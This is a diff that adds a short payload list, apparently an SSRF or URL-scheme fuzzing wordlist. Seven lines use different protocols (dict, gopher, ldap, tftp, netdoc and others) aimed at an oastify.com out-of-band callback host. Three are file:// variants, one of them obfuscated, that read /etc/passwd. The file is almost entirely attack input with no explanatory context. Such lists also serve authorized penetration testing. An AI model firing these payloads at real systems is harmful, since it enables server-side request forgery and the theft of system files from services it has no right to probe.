@@ -1,0 +1,10 @@
+dict://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com
+sftp://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com
+ldap://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com
+gopher://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com
+file://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com
+tftp://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com
+netdoc://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com
+file:///etc/passwd
+file://\/\/etc/passwd
+file://etc/passwd
